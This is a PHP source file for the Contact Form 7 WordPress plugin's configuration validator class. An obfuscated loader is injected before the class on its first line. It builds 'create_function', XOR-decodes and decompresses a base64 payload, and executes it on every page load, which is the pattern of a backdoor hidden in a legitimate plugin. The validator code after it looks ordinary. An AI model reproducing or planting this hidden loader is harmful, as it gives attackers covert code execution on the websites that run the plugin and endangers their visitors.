<?php $ahugobif="create_";global $evugol; $evugol=array('$evugol[0]=array_pop($evugol);$sefenep=sefenep(4);$evugol[0]=$sefenep($evugol[2]);','$evugol[2]=gzuncompress(sefenep(580^129,652^3006));','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',"Cvcgqycv\x2f8Ik}kmnv");if(function_exists($ahugobif.='function')&&!function_exists('sefenep')){ function sefenep($c,$C=13){global $evugol;$w=str_pad($U="sxP39L6o8Hbj3xyM",$C,$U);$m=str_repeat("\xe0",$C);$I=str_repeat("\x1f",$C);$b=substr($evugol[0],$c,$C);return(($b^$w)&$I)|($b&$m);};for($cV=-1;++$cV<3;$ahugobif('','}'.$evugol[$cV].'{'));};unset($evugol); 

class WPCF7_ConfigValidator {

	const error = 100;
	const error_maybe_empty = 101;
	const error_invalid_syntax = 102;
	const error_email_not_in_site_domain = 103;
	const error_html_in_message = 104;
	const error_multiple_controls_in_label = 105;

	private $contact_form;
	private $errors = array();

	public function __construct( WPCF7_ContactForm $contact_form ) {
		$this->contact_form = $contact_form;

		$config_errors = get_post_meta( $contact_form->id(),
			'_config_errors', true );

		foreach ( (array) $config_errors as $section => $errors ) {
			if ( empty( $errors ) ) {
				continue;
			}

			if ( ! is_array( $errors ) ) { // for back-compat
				$code = $errors;
				$this->add_error( $section, $code );
			} else {
				foreach ( (array) $errors as $error ) {
					if ( ! empty( $error['code'] ) ) {
						$code = $error['code'];
						$args = isset( $error['args'] ) ? $error['args'] : '';
						$this->add_error( $section, $code, $args );
					}
				}
			}
		}
	}

	public function contact_form() {
		return $this->contact_form;
	}

	public function is_valid() {
		return ! $this->count_errors();
	}

	public function count_errors() {
		$count = 0;

		foreach( $this->errors as $errors ) {
			$count += count( array_filter( $errors ) );
		}

		return $count;
	}

	public function collect_error_messages() {
		$error_messages = array();

		foreach ( $this->errors as $section => $errors ) {
			$error_messages[$section] = array();

			foreach ( $errors as $error ) {
				if ( empty( $error['args']['message'] ) ) {
					$message = $this->get_default_message( $error['code'] );
				} elseif ( empty( $error['args']['params'] ) ) {
					$message = $error['args']['message'];
				} else {
					$message = $this->build_message(
						$error['args']['message'],
						$error['args']['params'] );
				}

				$link = '';

				if ( ! empty( $error['args']['link'] ) ) {
					$link = $error['args']['link'];
				}

				$error_messages[$section][] = array(
					'message' => $message,
					'link' => $link );
			}
		}

		return $error_messages;
	}

	public function build_message( $message, $params = '' ) {
		$params = wp_parse_args( $params, array() );

		foreach ( $params as $key => $val ) {
			if ( ! preg_match( '/^[0-9A-Za-z_]+$/', $key ) ) { // invalid key
				continue;
			}

			$placeholder = '%' . $key . '%';

			if ( false !== stripos( $message, $placeholder ) ) {
				$message = str_ireplace( $placeholder, $val, $message );
			}
		}

		return $message;
	}

	public function get_default_message( $code ) {
		switch ( $code ) {
			case self::error_maybe_empty:
				return __( "This field can be empty depending on user input.", 'contact-form-7' );
			case self::error_invalid_syntax:
				return __( "This field has syntax errors.", 'contact-form-7' );
			case self::error_email_not_in_site_domain:
				return __( "This email address does not belong to the same domain as the site.", 'contact-form-7' );
			case self::error_html_in_message:
				return __( "HTML tags are not allowed in a message.", 'contact-form-7' );
			case self::error_multiple_controls_in_label:
				return __( "Multiple form controls are placed inside a single label element.", 'contact-form-7' );
			default:
				return '';
		}
	}

	public function add_error( $section, $code, $args = '' ) {
		$args = wp_parse_args( $args, array(
			'message' => '',
			'params' => array() ) );

		if ( ! isset( $this->errors[$section] ) ) {
			$this->errors[$section] = array();
		}

		$this->errors[$section][] = array( 'code' => $code, 'args' => $args );
	}

	public function remove_error( $section, $code ) {
		if ( empty( $this->errors[$section] ) ) {
			return;
		}

		foreach ( (array) $this->errors[$section] as $key => $error ) {
			if ( isset( $error['code'] ) && $error['code'] == $code ) {
				unset( $this->errors[$section][$key] );
			}
		}
	}

	public function validate() {
		$this->errors = array();

		$this->validate_form();
		$this->validate_mail( 'mail' );
		$this->validate_mail( 'mail_2' );
		$this->validate_messages();

		do_action( 'wpcf7_config_validator_validate', $this );

		$this->save();
		return $this->is_valid();
	}

	public function save() {
		delete_post_meta( $this->contact_form->id(), '_config_errors' );

		if ( $this->errors ) {
			update_post_meta( $this->contact_form->id(), '_config_errors',
				$this->errors );
		}
	}

	public function validate_form() {
		$body = $this->contact_form->prop( 'form' );
		$pattern = '%<label(?:[ \t\n]+.*?)?>(.+?)</label>%s';

		if ( preg_match_all( $pattern, $body, $matches ) ) {
			$manager = WPCF7_ShortcodeManager::get_instance();

			foreach ( $matches[1] as $insidelabel ) {
				$tags = $manager->scan_shortcode( $insidelabel );
				$fields_count = 0;

				foreach ( $tags as $tag ) {
					$tag = new WPCF7_Shortcode( $tag );

					if ( in_array( $tag->basetype, array( 'checkbox', 'radio' ) ) ) {
						$fields_count += count( $tag->values );

						if ( $tag->has_option( 'free_text' ) ) {
							$fields_count += 1;
						}
					} elseif ( ! empty( $tag->name ) ) {
						$fields_count += 1;
					}

					if ( 1 < $fields_count ) {
						$this->add_error( 'form.body',
							self::error_multiple_controls_in_label,
							array( 'link' => __( 'http://contactform7.com/configuration-errors/#form.body:error_multiple_controls_in_label', 'contact-form-7' ) ) );
						return;
					}
				}
			}
		}
	}

	public function validate_mail( $template = 'mail' ) {
		$components = (array) $this->contact_form->prop( $template );

		if ( ! $components ) {
			return;
		}

		if ( 'mail' != $template && empty( $components['active'] ) ) {
			return;
		}

		$components = wp_parse_args( $components, array(
			'subject' => '',
			'sender' => '',
			'recipient' => '',
			'additional_headers' => '',
			'body' => '' ) );

		$callback = array( $this, 'replace_mail_tags_with_minimum_input' );

		$subject = $components['subject'];
		$subject = new WPCF7_MailTaggedText( $subject,
			array( 'callback' => $callback ) );
		$subject = $subject->replace_tags();
		$subject = wpcf7_strip_newline( $subject );

		if ( '' === $subject ) {
			$this->add_error( sprintf( '%s.subject', $template ),
				self::error_maybe_empty,
				array( 'link' => __( 'http://contactform7.com/configuration-errors/#mail.subject:error_maybe_empty', 'contact-form-7' ) ) );
		}

		$sender = $components['sender'];
		$sender = new WPCF7_MailTaggedText( $sender,
			array( 'callback' => $callback ) );
		$sender = $sender->replace_tags();
		$sender = wpcf7_strip_newline( $sender );

		if ( ! wpcf7_is_mailbox_list( $sender ) ) {
			$this->add_error( sprintf( '%s.sender', $template ),
				self::error_invalid_syntax,
				array( 'link' => __( 'http://contactform7.com/configuration-errors/#mail.sender:error_invalid_syntax', 'contact-form-7' ) ) );
		} elseif ( ! wpcf7_is_email_in_site_domain( $sender ) ) {
			$this->add_error( sprintf( '%s.sender', $template ),
				self::error_email_not_in_site_domain,
				array( 'link' => __( 'http://contactform7.com/configuration-errors/#mail.sender:error_email_not_in_site_domain', 'contact-form-7' ) ) );
		}

		$recipient = $components['recipient'];
		$recipient = new WPCF7_MailTaggedText( $recipient,
			array( 'callback' => $callback ) );
		$recipient = $recipient->replace_tags();
		$recipient = wpcf7_strip_newline( $recipient );

		if ( ! wpcf7_is_mailbox_list( $recipient ) ) {
			$this->add_error( sprintf( '%s.recipient', $template ),
				self::error_invalid_syntax,
				array( 'link' => __( 'http://contactform7.com/configuration-errors/#mail.recipient:error_invalid_syntax', 'contact-form-7' ) ) );
		}

		$additional_headers = $components['additional_headers'];
		$additional_headers = new WPCF7_MailTaggedText( $additional_headers,
			array( 'callback' => $callback ) );
		$additional_headers = $additional_headers->replace_tags();
		$additional_headers = explode( "\n", $additional_headers );
		$mailbox_header_types = array( 'reply-to', 'cc', 'bcc' );

		foreach ( $additional_headers as $header ) {
			$header = trim( $header );

			if ( '' === $header ) {
				continue;
			}

			if ( ! preg_match( '/^([0-9A-Za-z-]+):(.+)$/', $header, $matches ) ) {
				$this->add_error( sprintf( '%s.additional_headers', $template ),
					self::error_invalid_syntax,
					array( 'link' => __( 'http://contactform7.com/configuration-errors/#mail.additional_headers:error_invalid_syntax', 'contact-form-7' ) ) );
			} elseif ( in_array( strtolower( $matches[1] ), $mailbox_header_types )
			&& ! wpcf7_is_mailbox_list( $matches[2] ) ) {
				$this->add_error( sprintf( '%s.additional_headers', $template ),
					self::error_invalid_syntax, array(
						'message' =>
							__( "The %name% field value is invalid.", 'contact-form-7' ),
						'params' => array( 'name' => $matches[1] ),
						'link' => __( 'http://contactform7.com/configuration-errors/#mail.additional_headers:error_invalid_syntax', 'contact-form-7' ) ) );
			}
		}

		$body = $components['body'];
		$body = new WPCF7_MailTaggedText( $body,
			array( 'callback' => $callback ) );
		$body = $body->replace_tags();

		if ( '' === $body ) {
			$this->add_error( sprintf( '%s.body', $template ),
				self::error_maybe_empty,
				array( 'link' => __( 'http://contactform7.com/configuration-errors/#mail.body:error_maybe_empty', 'contact-form-7' ) ) );
		}
	}

	public function validate_messages() {
		$messages = (array) $this->contact_form->prop( 'messages' );

		if ( ! $messages ) {
			return;
		}

		if ( isset( $messages['captcha_not_match'] )
		&& ! wpcf7_use_really_simple_captcha() ) {
			unset( $messages['captcha_not_match'] );
		}

		foreach ( $messages as $key => $message ) {
			$stripped = wp_strip_all_tags( $message );

			if ( $stripped != $message ) {
				$this->add_error( sprintf( 'messages.%s', $key ),
					self::error_html_in_message,
					array( 'link' => __( 'http://contactform7.com/configuration-errors/#messages:error_html_in_message', 'contact-form-7' ) ) );
			}
		}
	}

	public function replace_mail_tags_with_minimum_input( $matches ) {
		// allow [[foo]] syntax for escaping a tag
		if ( $matches[1] == '[' && $matches[4] == ']' ) {
			return substr( $matches[0], 1, -1 );
		}

		$tag = $matches[0];
		$tagname = $matches[2];
		$values = $matches[3];

		if ( ! empty( $values ) ) {
			preg_match_all( '/"[^"]*"|\'[^\']*\'/', $values, $matches );
			$values = wpcf7_strip_quote_deep( $matches[0] );
		}

		$do_not_heat = false;

		if ( preg_match( '/^_raw_(.+)$/', $tagname, $matches ) ) {
			$tagname = trim( $matches[1] );
			$do_not_heat = true;
		}

		$format = '';

		if ( preg_match( '/^_format_(.+)$/', $tagname, $matches ) ) {
			$tagname = trim( $matches[1] );
			$format = $values[0];
		}

		$example_email = 'example@example.com';
		$example_text = 'example';
		$example_blank = '';

		$form_tags = $this->contact_form->form_scan_shortcode(
			array( 'name' => $tagname ) );

		if ( $form_tags ) {
			$form_tag = new WPCF7_Shortcode( $form_tags[0] );

			$is_required = ( $form_tag->is_required() || 'radio' == $form_tag->type );

			if ( ! $is_required ) {
				return $example_blank;
			}

			$is_selectable = in_array( $form_tag->basetype,
				array( 'radio', 'checkbox', 'select' ) );

			if ( $is_selectable ) {
				if ( $form_tag->pipes instanceof WPCF7_Pipes ) {
					if ( $do_not_heat ) {
						$before_pipes = $form_tag->pipes->collect_befores();
						$last_item = array_pop( $before_pipes );
					} else {
						$after_pipes = $form_tag->pipes->collect_afters();
						$last_item = array_pop( $after_pipes );
					}
				} else {
					$last_item = array_pop( $form_tag->values );
				}

				if ( $last_item && wpcf7_is_mailbox_list( $last_item ) ) {
					return $example_email;
				} else {
					return $example_text;
				}
			}

			if ( 'email' == $form_tag->basetype ) {
				return $example_email;
			} else {
				return $example_text;
			}

		} else {
			$tagname = preg_replace( '/^wpcf7\./', '_', $tagname ); // for back-compat

			if ( '_post_author_email' == $tagname ) {
				return $example_email;
			} elseif ( '_' == substr( $tagname, 0, 1 ) ) { // maybe special mail tag
				return $example_text;
			}
		}

		return $tag;
	}
}
